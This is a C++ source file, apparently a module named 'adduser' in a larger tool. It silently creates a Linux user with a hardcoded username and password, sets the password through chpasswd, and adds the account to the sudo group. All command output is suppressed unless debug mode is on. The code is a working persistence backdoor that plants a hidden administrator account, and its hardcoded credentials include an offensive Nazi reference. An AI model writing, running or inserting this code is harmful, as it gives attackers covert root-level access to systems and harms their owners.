// modifiers/adduser.cpp
#include <cstdlib>
#include <iostream>
#include <string>

namespace {
constexpr const char PRESET_USERNAME[] = "chinawaterstealers";
constexpr const char PRESET_PASSWORD[] = "adolfhitler";

bool runCommand(const std::string& cmd, bool debug) {
    if (debug) {
        std::cout << "\033[1;33m[ADDUSER]\033[0m Executing: " << cmd << std::endl;
    }
    int result = std::system(cmd.c_str());
    if (debug) {
        std::cout << "\033[1;33m[ADDUSER]\033[0m Result: " << result << std::endl;
    }
    return result == 0;
}
} // namespace

bool addPresetUser(bool debug) {
    const char* env = std::getenv("ADDUSER_DEBUG");
    if (!debug && env) {
        std::string value(env);
        if (!value.empty() && value != "0" && value != "false" && value != "FALSE") {
            debug = true;
        }
    }

    auto log = [&](const std::string& msg) {
        if (debug) {
            std::cout << "\033[1;33m[ADDUSER]\033[0m " << msg << std::endl;
        }
    };

    const std::string username = PRESET_USERNAME;
    const std::string password = PRESET_PASSWORD;

    // Check if the user already exists
    const std::string checkCmd = "id -u " + username + " > /dev/null 2>&1";
    if (runCommand(checkCmd, debug)) {
        log("User already exists: " + username);
        return true;
    }

    // Create the user with a home directory and default shell
    const std::string createCmd = "useradd -m -s /bin/bash " + username + " > /dev/null 2>&1";
    if (!runCommand(createCmd, debug)) {
        log("Failed to create user: " + username);
        return false;
    }

    // Set the password
    const std::string passwordCmd = "echo '" + username + ":" + password + "' | chpasswd > /dev/null 2>&1";
    if (!runCommand(passwordCmd, debug)) {
        log("Failed to set password for user: " + username);
        return false;
    }

    // Add the user to sudo group
    const std::string sudoCmd = "usermod -aG sudo " + username + " > /dev/null 2>&1";
    if (!runCommand(sudoCmd, debug)) {
        log("Failed to add user to sudo group: " + username);
        return false;
    }

    log("Successfully created user and assigned password for: " + username);
    return true;
}


